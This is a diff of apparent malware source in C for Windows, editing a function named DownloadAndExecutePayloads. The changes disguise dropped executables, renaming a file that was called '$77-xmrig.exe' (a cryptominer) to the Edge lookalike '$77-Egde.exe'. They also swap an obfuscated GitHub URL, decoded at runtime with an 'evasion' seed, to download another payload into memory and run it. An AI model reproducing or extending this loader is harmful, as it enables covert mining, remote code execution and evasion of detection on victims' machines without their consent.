@@ -724,7 +724,7 @@ void DownloadAndExecutePayloads() {
     // Execute $77-Egde.exe
     char edgePath[MAX_PATH];
     lstrcpyA(edgePath, g_mallDir);
-    PathAppendA(edgePath, "$77-xmrig.exe");
+    PathAppendA(edgePath, "$77-Egde.exe");
     lstrcpyA(g_svchostPath, edgePath);
     
     STARTUPINFOA si = { sizeof(si) };
@@ -753,10 +753,10 @@ void DownloadAndExecutePayloads() {
     // Execute $77-SystemHelper.exe
     char helperPath[MAX_PATH];
     lstrcpyA(helperPath, g_mallDir);
-    PathAppendA(helperPath, "$77-SystemHelper.exe");
+    PathAppendA(helperPath, "$77-Hound.exe");
     
     // First try to execute from memory
-    OBF_STR helperUrl = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/$77-SystemHelper.exe", EVASION_SEED);
+    OBF_STR helperUrl = ObfuscateString("https://github.com/Drakovthe6th/TBuG/raw/master/$77-Hound.exe", EVASION_SEED);
     char* helperRealUrl = Deobfuscate(&helperUrl);
     DWORD helperSize = 0;
     BYTE* helperData = DownloadToMemory(helperRealUrl, &helperSize);
